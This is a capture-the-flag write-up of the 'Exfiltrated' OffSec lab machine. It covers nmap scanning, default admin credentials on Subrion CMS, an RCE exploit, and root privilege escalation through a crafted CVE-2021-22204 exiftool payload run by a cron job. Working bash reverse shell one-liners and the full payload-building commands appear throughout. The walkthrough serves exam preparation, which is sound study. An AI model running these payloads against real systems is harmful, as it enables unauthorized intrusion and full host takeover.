---
title: Exfiltrated - Easy - Linux - PG Practice
date: 2024-06-10
tags:
  - pg-practice
  - offsec
  - oscp-prep
  - linux
  - ospg
draft: false
---
# Exfiltrated - Easy - Linux - PG Practice

# *Scanning*

My basic scan runs the following command
```bash
nmap -sC -T5 -Pn -p- --min-rate=10000 $IP
```

```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ basic 192.168.162.163
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-10 05:53 EDT
Warning: 192.168.162.163 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.162.163
Host is up (0.16s latency).
Not shown: 36626 filtered tcp ports (no-response), 28907 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 c1994b952225ed0f8520d363b448bbcf (RSA)
|   256 0f448badad95b8226af036ac19d00ef3 (ECDSA)
|_  256 32e12a6ccc7ce63e23f4808d33ce9b3a (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/

Nmap done: 1 IP address (1 host up) scanned in 38.50 seconds
```

This gives us two running port, 22 for ssh and 80 for http.
Visiting the homepage gives us the following:
![[Pasted image 20240610152113.png]]
As service scans gives following result:
```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ nmap -sC -sV -T5 -Pn -p80 --min-rate=10000 192.168.162.163
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-10 05:56 EDT
Nmap scan report for exfiltrated.offsec (192.168.162.163)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Subrion CMS - Open Source Content Management System
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Home :: Powered by Subrion 4.2
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.04 seconds
```

	This shows the platform is running `Subrion CMS 4.2`

# *Exploitation*

#### **Subrion Weak Credentials**

Let’s us test some default combinations of `admin:admin`, `admin:password`, `subrion:subrion` or `root:toor` …

Luckily, the first combination (`admin:admin`) allows us to bypass the login prompt and land on the `Admin Dashboard` page.

There is an active `RCE exploit` on searchsploit as well
![[Pasted image 20240610152308.png]]

Running the following exploit gives us the `www-data` user
![[Pasted image 20240610152352.png]]

Using revshells.com to make a bash reverse shell and catch it using `nc`
```bash
$ bash -c "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
```

# *Privilege Escalation*
Checking the crontab shows us the following sus file running as root.
```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [ip] from (UNKNOWN) [192.168.162.163] 45084
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```

The following is sus
	`* *     * * *   root    bash /opt/image-exif.sh`
The shell `/opt/image-exif.sh` will be executed every one minute by `root`.

We can read the file
```bash
www-data@exfiltrated:/opt$ cat image-exif.sh
cat image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

Primarily, the script will look for any `jpg` file in the `/var/www/html/subrion/uploads` directory and execute `exiftool` against that file.

Checking the version of `exiftool` on the machine
```bash
www-data@exfiltrated:/opt$ exiftool -ver
exiftool -ver
11.88
```
The result implies that the current `exiftool` might be exploitable. We can test our theory by navigating along the [PoC](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce):

First we craft our exploit on local machine acccording to the givens steps of `CVE-2021-22204`
````
sudo apt-get update && sudo apt-get install -y djvulibre-bin
````
Now we craft an exploit for a `root` reverseshell
```
$ cat payload

(metadata "\c${system('bash -c \"bash -i >& /dev/tcp/192.168.45.197/2222 0>&1\"')};")
```

Now compress the payload using `bzz`
```bash
$ bzz payload payload.bzz
```

```
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```

```bash
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ cat configfile 
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%

```

```
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ exiftool -config configfile  '-HasselbladExif<=exploit.djvu' snowman.jpg
    1 image files updated
```

Now copy this to `/var/www/html/subrion/uploads` on `exfiltrated` machine, by starting a python server
```
┌──(kali㉿kali)-[~/…/PGPractice/Easy/Linux/Exfiltrated]
└─$ python3 -m http.server                                                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
www-data@exfiltrated:/opt$ cd /var/www/html/subrion/uploads
cd /var/www/html/subrion/uploads
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.197:8000/snowman.jpg
<ploads$ wget http://192.168.45.197:8000/snowman.jpg
--2024-06-10 10:41:56--  http://192.168.45.197:8000/snowman.jpg
Connecting to 192.168.45.197:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 124479 (122K) [image/jpeg]
Saving to: ‘snowman.jpg’

snowman.jpg         100%[===================>] 121.56K   197KB/s    in 0.6s    

2024-06-10 10:41:57 (197 KB/s) - ‘snowman.jpg’ saved [124479/124479]

www-data@exfiltrated:/var/www/html/subrion/uploads$ ls
ls
cmd-1.phar  cmd.phar  qavbfeuonalspfu.phar  snowman.jpg
```

Now we wait for the crontab to run on our exploit and meanwhile start a listener on the port we gave earlier. Within a minute we get `root` shell

```
└─$ nc -lnvp 2222                                  
listening on [any] 2222 ...
connect to [IP] from (UNKNOWN) [192.168.162.163] 47224
bash: cannot set terminal process group (3685): Inappropriate ioctl for device
bash: no job control in this shell
root@exfiltrated:~# whoami
whoami
root
root@exfiltrated:~# cd /root
cd /root
root@exfiltrated:~# cat proof.txt
cat proof.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

and become `ROOT :)`